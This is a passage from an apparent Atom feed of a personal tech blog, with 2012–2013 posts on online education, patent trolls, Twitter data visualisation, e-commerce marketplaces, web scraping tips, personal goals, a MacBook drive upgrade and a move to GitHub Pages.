<li><b>No video lectures</b>. The content can be better presented through text and visuals and helps people work on it at their own pace.</li>
<li><b>Each lesson would be focused on a particular problem</b>. Start by describing a problem and then spend time going over different ways of thinking about it as well as the different tools available. This should be as interactive as possible where students can follow along by running the code on their own computer.</li>
<li><b>Limited time spent on defining terms</b>. People are sitting in front of the computer and can do a search on Google or Stackoverflow to get more and better definitions than can be covered in a class.</li>
<li><b>Leveraging the volume of people taking the class</b>. When you have thousands of people taking a single class you can do things that you just wouldn’t be able to do normally. For example, you can analyze people’s programming solutions to see which solutions are the most common, which run the quickest, or which are the shortest. Having that information available to students would be much better than just getting a numerical score.</li>
</ul>

<p>This approach isn’t for everyone but that’s the point. Moving online will give us the ability to have classes custom tailored for each student but we need to start by thinking about building classes for the web from scratch rather than copying them from the classroom.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Patent troll troll</title>
   <link href="http://dangoldin.com/2013/01/29/the-patent-troll-troll/"/>
   <updated>2013-01-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/29/the-patent-troll-troll</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/patent-troll.jpg" alt="Patent troll" width="400" height="400"/>
  <p class="caption"><a href="http://www.article-3.com/fending-off-trolls-and-avoiding-elephants-99273">A Patent Troll</a></p>
</div>

<p><a href="http://arstechnica.com/tech-policy/2013/01/how-newegg-crushed-the-shopping-cart-patent-and-saved-online-retail/">Newegg recently defended</a> itself against a patent troll that sued them over a shopping cart patent. As a result, the patent was invalidated and Soverain Software will lose $2.5M from this and the $18M they won in 2011 from Victoria’s Secret and Avon. Unfortunately, they’ll still keep the tens of millions of dollars they “earned” in earlier years. Since virtually every ecommerce site has a shopping cart feature you’d think that this patent would have been invalidated sooner.</p>

<p>The reason it takes this long is that most companies settle when faced with a lawsuit and only a few fight back. Over time, companies that have a reputation for fighting back are sued less frequently and companies that do settle just pass the cost onto the consumer. It’s no surprise that these patents end up sticking around. Unfortunately, it’s a shitty situation for smaller businesses: they can’t afford a lawsuit and can’t afford to raise their prices.</p>

<p>What can we do to change these incentives around? Right now, a big advantage patent trolls have is that they make the first move and can choose who to sue and who to avoid. Why not bring the fight to them? A simple approach would be to find these these flawed patents and file for a <a href="http://en.wikipedia.org/wiki/Reexamination">reexamination</a> with the USPTO. <a href="http://patents.stackexchange.com/">Ask Patents</a> has already started collecting a database for prior art to challenge patent applications but this information can also be leveraged to challenge already granted patents. Another option would be to sue the patent troll directly, as Microsoft and Google <a href="http://www.fosspatents.com/2011/03/microsoft-and-google-jointly-sue-geotag.html">have done</a>, which has an added benefit of a jurisdiction other than <a href="http://www.thejuryexpert.com/2010/03/east-texas-jurors-and-patent-litigation/">East Texas</a>. An extreme approach would be to create shell companies that intentionally violate these patents in order to challenge them. Imagine a hackathon whose sole purpose is to create sites and companies that violate these patents in order to troll the troll. Why not bring the fight to them?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Blog updates since November</title>
   <link href="http://dangoldin.com/2013/01/24/blog-updates-since-november/"/>
   <updated>2013-01-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/24/blog-updates-since-november</id>
   <content:encoded><![CDATA[
<p>In November, I migrated my Tumblr and Wordpress blogs over to GitHub pages and have been making a few tweaks here and there. I started with the awesome <a href="http://jekyllbootstrap.com/">Jekyll-Bootstrap library</a> but wanted to share the changes I’ve made. It’s all hosted on GitHub so feel free to fork it.</p>

<ul>
<li>
    <b>Design changes</b><br />
    <ul class="bulleted">
    <li>The version I started with didn’t have the Bootstrap responsiveness library so I added that in</li>
    <li>Since I’m using it primarily as a blog, I updated the design to emphasize the blog aspect</li>
    <li>Consolidated the pagination and social sharing widget to fit on one line</li>
    <li>Incorporated some best practices from <a href="http://www.kaikkonendesign.fi/typography/section/1">Kaikkonen's blog typography guide</a></li>
    </ul>
</li>
<li>
    <b>Backend changes</b><br />
    <ul class="bulleted">
    <li>Small improvements to SEO by giving ability to add keywords to each page</li>
    <li>Added Open Graph meta tags to control what’s displayed when people share the page on Facebook</li>
    <li>Made a few tweaks to the way the sitemap was being generated</li>
    </ul>
</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why aren't there more engineers in politics?</title>
   <link href="http://dangoldin.com/2013/01/23/why-arent-there-more-engineers-in-politics/"/>
   <updated>2013-01-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/23/why-arent-there-more-engineers-in-politics</id>
   <content:encoded><![CDATA[
<p>At Aaron Swartz’s memorial service in New York, Doc Searle said something that struck a chord: Aaron was one of the few tech people who would get involved in legal and political issues. It’s true - we hackers aren’t into it. We claim we’d be better off if there were more engineers in charge and yet we’re not making an effort to be those engineers. I’ve heard a variety of unconvincing reasons: it’s just not interesting; there’s too much bullshit; it’s more about selling than creating. I think the real reason is that we’re just too impatient.</p>

<p>Our roles and jobs have made us this way. Our work tends to have well structured problems that are solved through individual effort. Only when we have to rely on someone else do we become aware of how slow things move and how long things take. Even the agile methodology, for all its wonders, focuses on the short term and encourages small, easy achievable tasks. It’s no surprise that when we encounter something that takes longer than we’re used to that we dismiss it as not for us.</p>

<p>Impatience is also why I had difficulty as a product manager after coding for 5 years. I had a grand vision of what needed to be done but wasn’t able to execute it. I blamed it on the politics but it was really my impatience and immaturity. It was easier to work with developers to build the product features and just release them than it was to work with the actual users and get them on board. That would have required understanding their use cases, listening to everyone’s concerns, having a trial period, and all sorts of other things that would take too long.</p>

<p>Most of us do want to make the world better and do make an effort to contribute; we give up too soon. During the service, Roy Singham quoted Frederick Douglass:  “If there is no struggle, there is no progress.” Real progress takes time and we need to get comfortable with that if we want to see it happen.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Making sense of my Twitter archive</title>
   <link href="http://dangoldin.com/2013/01/19/making-sense-of-my-twitter-archive/"/>
   <updated>2013-01-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/19/making-sense-of-my-twitter-archive</id>
   <content:encoded><![CDATA[
<p>I finally got access to my Twitter archive and decided to have some fun with it and also give me an excluse to play around with <a href="http://matplotlib.org/">matplotlib</a>. The first step was just seeing what the data looked like and what information was available. Turns out that Twitter included a simple HTML page to let you browse your tweets but also provided CSV files for each month. The fields were pretty self explanatory but one “gotcha” was needing to convert the timestamp to my local time. I wanted to do a few data visualizations to see what my tweeting behavior was like and also see if anything insightful came out. As I started looking at the visualizations I noticed that I’m more active than I used to be and that I have a pretty stable relationship betweet my tweets, my RTs, and my replies. In the future, I’d like to explore how my usage of Twitter has evolved and also get to play around with the <a href="http://nltk.org/">NLTK library</a>.</p>

<p>I’ve committed by ugly code to github if anyone wants to play around with it: <a href="https://github.com/dangoldin/twitter-archive-analysis">https://github.com/dangoldin/twitter-archive-analysis</a>. I know the code is ugly. I’ll clean it up one of these days.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-hour.png" alt="Tweets sent by hour" width="800" height="600" layout="responsive"/>
      <p>Apparently, I like to tweet evenings and nights.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-dow.png" alt="Tweets sent by day of week" width="800" height="600" layout="responsive"/>
      <p>You can see I like to take my Fridays and Saturdays easy. Since I also tend to tweet more frequently at night this indicates I'll go out Friday and Saturday nights.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month.png" alt="Tweets sent by month" width="800" height="600" layout="responsive"/>
      <p>I was pretty much quiet since I got on Twitter in 2008 but have been more consistent since 2012.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-dow.png" alt="Tweets sent by month and day of week" width="800" height="600" layout="responsive"/>
      <p>I must admit this one's here mostly because I wanted to do a heatmap but this does reinforce that I've been a more active on Twitter since 2012 and that I'm less active on Friday and Saturday.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-length.png" alt="Average length of a tweet by month" width="800" height="600" layout="responsive"/>
      <p>I started off barely saying anything but it looks as if I'm consistently around ~90 characters per tweet.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-type.png" alt="Type of tweet sent by month" width="1200" height="600" layout="responsive"/>
      <p>I wanted to see whether my behavior around tweeting, retweeting, or replying has changed over time but this doesn't make it very clear due to the number of lines going on so I decided to normalize it - see next chart.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-type-stacked.png" alt="Type of tweet sent by month - normalized" width="800" height="600" layout="responsive"/>
      <p>Now we're on to something. In the beginning I was basically posting short tweets about my life but more recently I have been more involved in the community aspects.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What do Fab and Groupon have in common?</title>
   <link href="http://dangoldin.com/2013/01/15/what-do-fab-and-groupon-have-in-common/"/>
   <updated>2013-01-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/15/what-do-fab-and-groupon-have-in-common</id>
   <content:encoded><![CDATA[
<p><a href="http://www.groupon.com/">Groupon</a> has fascinated me since they’ve launched. It popularized an entirely new business model, encouraged the launch of hundreds of competitors, and was able to IPO three years after being founded. This sounds great until you look at the performance after the IPO: the stock is down 80% and it’s consistently missing the quarterly goals.</p>

<p>The daily deals space isn’t as profitable as it used to be and they’re trying to become a tool platform for small businesses. To grow beyond daily deals, they’ve been on an acquisition spree. Over the past two years they’ve acquired a <a href="http://techcrunch.com/2011/12/07/groupon-debuts-scheduler-to-streamline-online-bookings-for-merchants-consumers/">scheduling startup</a>, a <a href="http://techcrunch.com/2012/01/20/groupon-buys-social-shopping-platform-mertado-to-bolster-groupon-goods">social shopping startup</a>, <a href="https://upserve.com/platform/restaurant-pos/">POS system</a>, and a <a href="http://savored.com/">restaurant reservation system</a>. I don’t think this will be enough for them to get seen as something bigger than daily deals.</p>

<p>Groupon grew by providing steep discounts to consumers but sacrificed businesses in the process. It will be a hard sell trying to get a business to use your tools when a few months ago you were telling them to discount their products more than 50%. I understand that they needed to do this to grow and I’m sure they even had a choice: the space was so competitive that if they didn’t do this someone else surely would have. It just puts them in a pretty tough spot.</p>

<p>Recent fast growing ecommerce businesses have also favored the consumer over the business. This leads to quick initial growth but causes problems in the long term. <a href="http://fab.com/">Fab</a> is taking this approach as well by providing steep discounts on designer products. Consumers are loving it but what happens when there aren’t any businesses left who are willing to agree to such a discount? Sure, using Groupon and Fab can be viewed as a marketing expense but I suspect they and their investors want to be seen as more.</p>

<p>It’s difficult to balance the needs of the various sides of a marketplace. You do want to <a href="https://hbr.org/2006/10/strategies-for-two-sided-markets">subsidize one side</a> but it’s dangerous to favor the consumer side so much since it’s difficult to distance yourself from. Maybe it is the proper approach in the beginning but there needs to be a way to get out and I think that’s a tough problem. <a href="http://www.etsy.com/">Etsy</a> and <a href="https://www.airbnb.com">AirBnB</a> had slower growth but were able to align the incentives of the various sides of the market early on. It was easier for them since there’s overlap between the two sides (sellers are buyers and buyers are sellers) but I suspect this is still the right approach for long term success.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Is the pen mightier than the sword in a social world?</title>
   <link href="http://dangoldin.com/2013/01/11/is-the-pen-mightier-than-the-sword-in-a-social-world/"/>
   <updated>2013-01-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/11/is-the-pen-mightier-than-the-sword-in-a-social-world</id>
   <content:encoded><![CDATA[
<p>The recent revolt around Instagram’s TOS changes got me thinking about the revolt against SOPA/PIPA and the impact social media is having on cultural participation. We’re wired to want to improve things and when we come across what we feel is an injustice we want to change it. Unfortunately, social media has made us lazy. Sharing something on Twitter or Facebook gives us the nice, warm feeling that we’re actively contributing to a cause. Instead of going out and demonstrating in public, snail mailing our representatives, or providing financial support, we’re clicking a link and think we’re making a difference. PIPA/SOPA wasn’t stopped due to internet outrage but from people calling their representatives and doing more than just mentioning their opposition. Wikipedia and Reddit didn’t just put a message up saying they oppose PIPA/SOPA but blacked out their site. Would the result be the same if they just had a message stating they opposed it?</p>

<p>Social media is great at raising awareness, it’s just not very useful until someone down the line acts on it. Does the increase in awareness lead to actual change? This simplicity and reach also leads to a massive number of causes being championed. I can’t login to Facebook without seeing some cause being shared and promoted. Causes now need to market themselves as much as a consumer product. Are we really better off?</p>

<p>I can’t help but think of the pen and sword metaphor. The pen is mightier than the sword because the pen is able to get many swords. Does social media just give everyone pens or does it lead to more swords?</p>

<p>My way of dealing with this is to take a real action every time I share something on social media. If I share a Kickstarter project then I will donate to it. If I share opposition or support of a bill, I will call my representative. We’d be in much better shape if everyone did the same.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Web scraping like a pro</title>
   <link href="http://dangoldin.com/2013/01/09/web-scraping-like-a-pro/"/>
   <updated>2013-01-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/09/web-scraping-like-a-pro</id>
   <content:encoded><![CDATA[
<p>I’ve done my fair share of scraping ever since I started coding and just wanted to share some tips I’ve picked up along the way. I think scraping is a great, practical way to get into coding that is also immediately useful. It also forces you to understand the HTML of a page which gives you a great foundation when you’re ready to create your own site.</p>

<p>Hope they’re useful!</p>

<ul>
<li><b>Avoid it if possible</b><br />
It is a bit odd that I’m starting off with this as the first tip but if there are alternatives definitely take a look at those; many sites come with an API and that may be a much better approach. Otherwise, every time there’s a change in the HTML structure you run a risk of breaking your scraper which will leave you scrambling to fix your code. It’s also a good idea to organize your code such that a change in the HTML for one of the scraped items does not break the others. For example, if you want to get the name and address of a restaurant from Yelp, have one method that will get the name and another that will get the address. This will most likely be less efficient so you’ll need to use your judgement to see whether the risk-speed tradeoff is worth it.
</li>

<li><b>Use a library</b>&lt;/br/&gt;
Unless you’re doing a one off job, use a library. Every major language has one: Python has <a href="http://www.crummy.com/software/BeautifulSoup/">BeautifulSoup</a>, Perl has <a href="http://search.cpan.org/~cjm/HTML-Tree-5.03/lib/HTML/TreeBuilder.pm">HTML::TreeBuilder</a>, Javascript has <a href="https://npmjs.org/package/htmlparser">htmlparser</a>, and there’s no excuse to not use one. If you ever need to go back to make some changes (which you most likely will need to), you’ll be glad you did. You can also find libraries that let you simulate browser behavior by storing cookies and letting you submit forms. This gives you the ability to scrape sites that require a login. Some sites try to prevent scraping by obfuscating their HTML a bit in which case you’ll need to do either a string replacement or a basic regular expression to get it parsed by the library.
</li>

<li><b>HTML/DOM inspectors are a must</b><br />
Since scraping requires getting specific elements from a web page, we need to understand the HTML structure of that page. For me, doing this work within the browser works best since it gives you the ability to both see the HTML that’s responsible for a certain element and also gives you a console window which lets you test a scraping approach. The two browsers I’ve used successfully for this are <a href="https://www.google.com/intl/en/chrome/browser/">Google Chrome</a> and <a href="http://www.mozilla.org/en-US/firefox/new/">Firefox</a> with the <a href="http://getfirebug.com/">Firebug</a> plugin.
</li>

<li><b>User agent spoofing</b><br />
Every time your browser visits a website, it submits a request that contains information about the browser. This is why some sites show a different page when you’re using a phone versus a computer. Every once in awhile you will need to trick the site into sending back the proper page by “spoofing” the user agent. A simple way to check if you need to do this is to view the source of a page in a browser and compare it with what you’re retrieving in your code. If they’re different, try changing the user agent and see if that fixes it.
</li>

<li><b>Be clever</b><br />
Looking at the source of a page may be a bit overwhelming and there may be easier ways of getting at that information so be clever! An example of two approaches that I stumbled across were to spoof a mobile browser and to call the AJAX url directly. Spoofing a mobile browser tends to give you simpler and more lightweight HTML which is easier to parse. Loading the content via AJAX lets you get at the content quicker and usually in a more structured format, like JSON or XML. These approaches won’t work on every site so you need to do some research and experiment a little to understand how each site is setup. After that you can figure out the best approach for your scraper.
</li>

<li><b>Be specific</b><br />
When scraping, you want to make your scraping code rigorous enough to not fail if the page structure ever changes. A good rule of thumb is to be specific when you write your scraper. Use a specific id rather than a class since the id is guaranteed to be unique. Similarly, avoid an ordinal approach where you reference the 2nd or 3rd div. Sometimes this is unavoidable but try to see if there’s another approach. Another useful tidbit is to use the more content-descriptive identifier in the page. For example, if you see a div with the address you want to scrape and that div has two classes, “location-address” and “blue-highlight”, use the “location-address” one since that’s defining what the content is, not how it’s displayed.
</li>

<li><b>Save the HTML of the retrieved pages</b><br />
It’s helpful to save each HTML page you’ve retrieved. It takes a few iterations to get your scraping code working and it’s quicker to just have the HTML on disk so you don’t have to download it every time the script runs. Another advantage is that if you discover a mistake in your code, you don’t have to redownload all the pages you’ve already processed. It only takes a few minutes of work and worth doing.
</li>

<li><b>Monitor actively</b><br />
Scraping is prone to breaking so make sure you monitor the job as it runs. It’s likely that your code will work well on one page but will fail on others. I tend to write my code to be a bit picky at first while I work out the kinks and once I’m confident in it I will build in some logic to deal with a missing value to make sure it continues to run. As I mentioned earlier, storing the HTML of the page will save you time if you need to update your scraper and need to rerun it.
</li>

<li><b>Throttle your requests</b><br />
If you don’t want your roommates pissed pissed at you, which will happen when Yelp blocks you for 6 months, throttle your requests. The simple way to do this is to have your code wait in between downloading pages and another approach is to use proxies to hide your true IP address. This will make it seem that the requests are coming from a variety of computers and keep your roommates happy.
</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2013 Goals</title>
   <link href="http://dangoldin.com/2013/01/02/2013-goals/"/>
   <updated>2013-01-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/02/2013-goals</id>
   <content:encoded><![CDATA[
<p>Now’s the time people are making resolutions for 2013 so I’m going to join the club. I’m publishing them publicly since that should help my motivation. I’m also calling them goals since a goal seems harder to abandon than a resolution. I’m hoping that having these goals be specific, however arbitrary, will also help me in achieving them.</p>

<p>Here goes:</p>

<ul>
	<li>
	<b>Run 1000 miles in 2013</b><br />
	I’ve gotten out of shape over the past couple of months and that’s a bad place to be in the late 20s. I think it’s important to get good habits now since that will help me maintain my health as I get older. Not to mention that being in better physical health will improve my acuity.
	</li>
	<li>
	<b>Write at least 2 blog posts a week</b><br />
	The more I work with various people the more I realize the importance of communication. Writing doesn’t come easily to me and I spend the majority of time editing but I’m hoping that it’ll be easier by the end of 2013. And although writing is just one aspect of communication, improving that will lay a solid foundation for the others.
	</li>
	<li>
	<b>Meet up with 2 old acquaintances each month</b><br />
	Going from a company with hundreds of employees to working with a cofounder reduces the number of people you have contact with. By restoring my old relationships I’ll be able to connect with old friends and strengthen my network. Something I’ve learned over the past year of meeting with various folk in the NYC startup community is to end every meeting with an offer to help and I’m going to adopt that attitude as well.
	</li>
	<li>
	<b>Develop 6 side projects</b><br />
	This one’s here for a few reasons. One, I want to keep on improving and starting a project from scratch is a great way to work with new technologies and explore different approaches. There are many times that I want to go back to my existing code and rewrite it but why fix something that isn’t broken? Isn’t it better to put that energy into something new? Two, I want to give back to the community and putting these projects on GitHub will hopefully help someone. Three, this will just be a good outlet for when I need a break from the main gig. Four, I want to build my personal brand and having more more of my work publicly available will hopefully help.
	</li>
	<li>
	<b>Start a hands-on hobby</b><br />
	This one stems from a personal belief that I just need to do something with my hands since I spend so much time in front of the computer. This may end up being drawing, painting or woodworking but the goal is to find something that allows me create something physical and not digital. I’ve already dug up some colored pencils and drawing paper and am in the process of signing up for a woodworking class at a hands-on coworking space in Brooklyn called <a href="http://www.3rdward.com/">3rd Ward</a>.
	</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Year in Review 2012</title>
   <link href="http://dangoldin.com/2013/01/01/year-in-review-2012/"/>
   <updated>2013-01-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/01/01/year-in-review-2012</id>
   <content:encoded><![CDATA[
<p>I’m finally in a position to do a “Year in Review” post that I’m comfortable writing. In March I left my full time job to pursue <a href="http://www.glos.si">Glossi</a>, our startup, full time. In May, we were accepted into an <a href="http://eranyc.com/">incubator</a> and had an amazingly productive four months. Unfortunately, none of us were passionate about the direction Glossi was headed and we’ve ended the year pursuing a new venture, <a href="http://makersalley.com/">Makers Alley</a>.</p>

<p>I learned a ton about myself but along with that came the realization of how much I don’t know. Working as one of three cofounders on a startup forced me to develop a much broader set of skills. I understand the whole technology stack better and can actually make a passable website now (mostly thanks to <a href="http://twitter.github.com/bootstrap/">Bootstrap</a>) but I can also discuss trademark and copyright law with lawyers as well as do some tax planning with an accountant. I’m not too interested in pursuing law or accounting as a profession but it’s great being able to follow along and chime in every once in a while with something useful.</p>

<p>More important than the skills, I’ve learned more about myself in the past year than I have in my entire professional life. I’ve discovered that money is not as important to me as I thought and that the control over my day is important to me, even if it does mean more work for less pay. I have a better understanding of my strengths and how they are best applied. I also know what my weaknesses are and am working on a few goals for 2013 which I’ll publish over the next few days. I’m still trying to figure out my exact passions but at least I’m starting to acknowledge that they need to be discovered.</p>

<p>Lastly, I want to acknowledge how lucky I am to even be in this position. It’s wonderful having a <a href="https://twitter.com/sayitaintsho">wife</a> and family who support me through all this, I know it can’t be easy.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Self hosted Instagram export</title>
   <link href="http://dangoldin.com/2012/12/19/self-hosted-instagram-export/"/>
   <updated>2012-12-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/12/19/self-hosted-instagram-export</id>
   <content:encoded><![CDATA[
<p>I just hacked together a quick app to help download Instagram photos. At first, I tried using <a href="http://instaport.me">Instaport</a> and <a href="https://openphoto.me/">OpenPhoto</a> but both of them were backed up with others trying to do the same so I decided to create my own. It’s basically a really simple python web app that allows you do a quick authentication with Instagram and then lets you downloads all your images to your hard drive.</p>

<p>It should be pretty easy to get started by following the readme on github: <a href="https://github.com/dangoldin/instagram-download">https://github.com/dangoldin/instagram-download</a></p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The joy of upgrading an HD in a Macbook</title>
   <link href="http://dangoldin.com/2012/12/16/upgrade-fun/"/>
   <updated>2012-12-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/12/16/upgrade-fun</id>
   <content:encoded><![CDATA[
<p>As a gift to myself I decided to upgrade the RAM and HD in my MacBook. The plan was to replace the old HD with the new one and then use the install disc to install Snow Leopard on the new HD before upgrading to Mountain Lion. Unfortunately, it turned out that I had a bad install disc and had to come up with another approach. The general idea was to upgrade to Mountain Lion first in order to create another boot disc.</p>

<ol>
  <li>Upgrade OS to Mountain Lion and make sure to have a copy of the installation file around</li>
  <li>Put the new HD into an external enclosure</li>
  <li>Create two partitions on the new HD, one should be 8 GB to hold the Mountain Lion install boot disc</li>
  <li>Use <a target="_blank" href="http://blog.gete.net/lion-diskmaker-us/">Lion Disk Maker</a> to create the boot disc on the 8 GB partition of the new HD (<a target="_blank" href="http://osxdaily.com/2012/07/25/create-os-x-mountain-lion-boot-dvd-usb-drive-liondiskmaker/">instructions</a>)</li>
  <li>Shut down the computer and replace your HD with the new HD</li>
  <li>Boot your computer while holding down the option key</li>
  <li>Select the Mountain Lion boot disc from the selection screen and install it on the other partition</li>
  <li>Mountain Lion is now installed on the new HD</li>
  <li>You can now remove the Mountain Lion boot partition and use that space for something else</li>
</ol>

<p>An easier approach would have been to just use a USB flash drive or an SD card to create the boot disc. Unfortunately, I didn’t have any that had a capacity of more than 8 GB so I had to resort to this hack.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Entrepreneurship is not a job</title>
   <link href="http://dangoldin.com/2012/11/29/entrepreneurship-is-not-a-job/"/>
   <updated>2012-11-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/11/29/entrepreneurship-is-not-a-job</id>
   <content:encoded><![CDATA[
<p>
Let’s start with a joke:
</p>

<blockquote>
    An American consultant was at a pier in a small coastal Mexican village when a small boat with just one fisherman docked. Inside the small boat were several large tuna. The American complimented the Mexican on the quality of his fish and asked how long it took to catch them.<br /><br />
    The Mexican replied "Only a little while." The consultant then asked why didn't he stay out longer and catch more fish? The fisherman said he had enough to support his family's immediate needs. Then the American asked how he spent the rest of his time.<br /><br />
    The Mexican fisherman said, "I sleep late, fish a little, play with my children, take a siesta with my wife, Maria, and then stroll into the village each evening where I sip wine and play guitar with my amigos. I have a full and busy life, senor."<br /><br />
    The American consultant scoffed, "I am a very successful business consultant and could help you. You should spend more time fishing and, with the proceeds, buy a bigger boat. With the proceeds from the bigger boat, you could buy several boats, and eventually you would have a fleet of fishing boats. Instead of selling your catch to a middleman you would sell directly to the processor, eventually opening your own cannery. You would control the product, processing and distribution. You would need to leave this small coastal fishing village and move to Mexico City, then Los Angeles and eventually New York City where you will run your expanding enterprise."<br /><br />
    The Mexican fisherman asked, "But senor, how long will this all take?"<br /><br />
    The consultant replied, "Probably 15 to 20 years."<br /><br />
    "But what then, senor?" asked the fisherman.<br /><br />
    The consultant laughed, and said, "That's the best part! When the time is right, you would announce an IPO and sell your company stock to the public. You'll become very rich, you would make millions!"<br /><br />
    "Millions, senor?" replied the Mexican. "Then what?"<br /><br />
    The American said, "Then you would retire. Move to a small coastal fishing village where you would sleep late, fish a little, play with your kids, take siestas with your wife, stroll to the village in the evenings where you could sip wine and play your guitar with your amigos."
</blockquote>
<p>Other than the chuckle, this joke got me thinking about how people view work. The joke suggests that you should only work to support your life outside of work. If you work more than that then the joke’s on you since you’re sacrificing your personal life. This is view that you can’t have if you’re starting a company. Entrepreneurs need to combine their personal and professional lives. If you’re running a startup and aren’t thinking about the market, your product, or your users when you’re in the shower or in bed you’re doing it wrong. More importantly, this should be natural and not forced. If you don’t enjoy thinking about your startup when times are good, how will you be able to do it when times are tough (which they will be)? We need our passion to get over the humps so if you’re not passionate about your startup when you’re starting out, you will abandon it when facing challenges. Your startup will end up consuming you so why not pick something that you care about?</p>

<!--
Job

Two types
- Separate personal from professional
- Combine the two

Entrepreneurs strive to combine the two.

Thinking about the market, problems, marketing, bugs, etc.

I want to combine the two. I don’t want them to be separate. I enjoy thinking about markets, products, and everything in between.
-->
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Github Migration Notes</title>
   <link href="http://dangoldin.com/2012/11/14/migration-notes/"/>
   <updated>2012-11-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/11/14/migration-notes</id>
   <content:encoded><![CDATA[
<p>After a few hours of solid work I was able to get my new site up and running on Github pages. I got frustrated with
having too many blogs and decided that I should finally get it together and consolidate everything. Within a few hours
I was able to get it up and running on Github pages up and migrated my old Tumblr and Wordpress posts. Hopefully this
encourages me to write more.</p>

<p>A few notes:</p>
<ol>
  <li>The <a href="https://github.com/mojombo/jekyll">documentation</a> for Jekyll is great and makes it very easy to get started.</li>
  <li>Jekyll comes with a few <a href="https://github.com/mojombo/jekyll/wiki/blog-migrations">migration</a> scripts that made it easy to move the old blog posts over.</li>
  <li>There’s a pretty strong community around it so it’s easy to get started with themes. I ended up using <a href="http://jekyllbootstrap.com/">one</a> based on
Twitter Bootstrap.</li>
  <li>Github pages provide a custom domain option so you can host your entire site in Github. Other than the fact that it’s
free, you don’t have to worry about your site dying due to heavy load.</li>
  <li>An issue to be aware of is that the Jekyll parser is pretty strict and doesn’t provide very helpful error messages. I
had an issue that prevented some posts from migrating because they had a “:” in the titles. To discover this, I had to
migrate a few posts at a time until I was able to identify the issue.</li>
</ol>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Hello, Github!</title>
   <link href="http://dangoldin.com/2012/11/13/migrating-posts-here-from-tumblr-and-wordpress/"/>
   <updated>2012-11-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/11/13/migrating-posts-here-from-tumblr-and-wordpress</id>
   <content:encoded><![CDATA[
<p>I’m going to work on migrating my posts over from Wordpress and Tumblr on to here. Let’s see how it goes.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Eating Yourself - Innovation &amp; Cannibalization</title>
   <link href="http://dangoldin.com/2012/08/12/eating-yourself-innovation-and-cannibalization/"/>
   <updated>2012-08-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/08/12/eating-yourself-innovation-and-cannibalization</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/snakeself.jpg" width="550" height="370" layout="responsive"/>

<p>I was rereading the HBR paper on <a href="http://hbr.org/2006/10/strategies-for-two-sided-markets/ar/1" target="_blank">Strategies for Two Sided Markets</a> and came across a passage describing Apple’s mistake of trying to monetize both sides of their market, the consumers and the developers, rather than focusing on one like Microsoft did by giving away the SDK for free.</p>

<p>It got me thinking about Apple’s recovery. Many people credit the iPod with revitalizing Apple but I think there’s more than that. I suspect the bigger reason was the decline of desktop software and the ability to be productive on the web. Suddenly the network effects that existed by having software that only worked on Windows no longer existed. Software started migrating to the web and people were more willing to try new operating systems out. In 2006, I switched to Linux without too much trouble. It was also simple to find help online to deal with the various issues I ran into which made the transition easier. In some ways, Google helped Apple recover by speeding up the move to the web with a more accurate search and a good set of productivity apps.</p>

<p>In general, it’s damn difficult to overcome network effects. Google will not be replaced by a search engine. Facebook will not be replaced by a social network. These network effects will be broken by a behavioral change. Instagram rode this wave of behavioral change of the move to mobile and it was a savvy move for Facebook to make the acquisition. It makes you wonder what Instagram could have become had it stayed independent.</p>

<p>Innovation is cannibalization. By pushing the envelope of technology, pioneering companies cause behavioral changes that will give rise to companies that may end up replacing them. As Clay Christensen <a href="http://www.amazon.com/The-Innovators-Dilemma-Revolutionary-Essentials/dp/0060521996" target="_blank">notes</a>, it’s rare for a mature company to put resources behind a disruptive technology that will cannibalize itself but it’s the only way to stay relevant. Only <a href="http://mjperry.blogspot.com/2011/11/fortune-500-firms-in-1955-vs-2011-87.html" target="_blank">13% of the companies</a> in 1955’s Fortune 500 made the list in 2011. It’s amazing to see how quickly things change and the pace is only getting quicker.</p>
]]></content:encoded>
 </entry>
 
 <entry>
